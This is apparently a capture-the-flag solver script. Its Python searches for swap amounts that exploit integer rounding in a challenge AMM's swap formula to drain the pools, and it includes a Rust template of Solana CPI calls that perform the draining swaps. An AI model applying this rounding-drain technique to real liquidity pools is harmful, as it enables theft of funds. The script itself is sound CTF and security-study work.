pool_a_amount = 10
pool_b_amount = 10
player_a_amount = 10
player_b_amount = 0


def f(pool_a_amount, pool_b_amount, player_a_amount, player_b_amount):

    max_total_player_amount = 0
    optimal_strategy = None

    for first_amount in range(1, player_a_amount + 1):
        x = pool_a_amount
        y = pool_b_amount
        amount = first_amount

        out_amount = y - (x * y) // (x + amount)

        player_a_amount_2 = player_a_amount - amount
        player_b_amount_2 = player_b_amount + out_amount
        pool_a_amount_2 = pool_a_amount + amount
        pool_b_amount_2 = pool_b_amount - out_amount

        for second_amount in range(1, player_b_amount_2 + 1):
            x = pool_b_amount_2
            y = pool_a_amount_2
            amount = second_amount

            out_amount = y - (x * y) // (x + amount)

            player_b_amount_3 = player_b_amount_2 - amount
            player_a_amount_3 = player_a_amount_2 + out_amount
            pool_b_amount_3 = pool_b_amount_2 + amount
            pool_a_amount_3 = pool_a_amount_2 - out_amount

            total_player_amount = player_a_amount_3 + player_b_amount_3
            if total_player_amount > max_total_player_amount:
                max_total_player_amount = total_player_amount
                optimal_strategy = (first_amount, second_amount, pool_a_amount_3, pool_b_amount_3, player_a_amount_3, player_b_amount_3)

    return optimal_strategy


rust_snippet = """
        let cpi_accounts = chall::cpi::accounts::Swap {
            swap: ctx.accounts.swap.clone(),
            payer: ctx.accounts.payer.to_account_info(),
            pool_a: ctx.accounts.pool_a.to_account_info(),
            pool_b: ctx.accounts.pool_b.to_account_info(),

            user_in_account: ctx.accounts.user_in_account.to_account_info(),
            user_out_account: ctx.accounts.user_out_account.to_account_info(),

            token_program: ctx.accounts.token_program.to_account_info(),
        };

        let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);

        chall::cpi::swap(cpi_ctx, FIRST_AMOUNT, true)?;

        let cpi_accounts = chall::cpi::accounts::Swap {
            swap: ctx.accounts.swap.clone(),
            payer: ctx.accounts.payer.to_account_info(),
            pool_a: ctx.accounts.pool_a.to_account_info(),
            pool_b: ctx.accounts.pool_b.to_account_info(),

            user_in_account: ctx.accounts.user_out_account.to_account_info(),
            user_out_account: ctx.accounts.user_in_account.to_account_info(),

            token_program: ctx.accounts.token_program.to_account_info(),
        };

        let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);

        chall::cpi::swap(cpi_ctx, SECOND_AMOUNT, false)?;
"""

for i in range(100):
    first_amount, second_amount, pool_a_amount, pool_b_amount, player_a_amount, player_b_amount = f(pool_a_amount, pool_b_amount, player_a_amount, player_b_amount)
    if False:
        # print(rust_snippet.replace("FIRST_AMOUNT", str(first_amount)).replace("SECOND_AMOUNT", str(second_amount)))
        pass
    else:
        print(f"sell {first_amount} A tokens")
        print(f"sell {second_amount} B tokens")
        print(f"{player_a_amount, player_b_amount=}")
    if player_a_amount + player_b_amount == 29:
        break
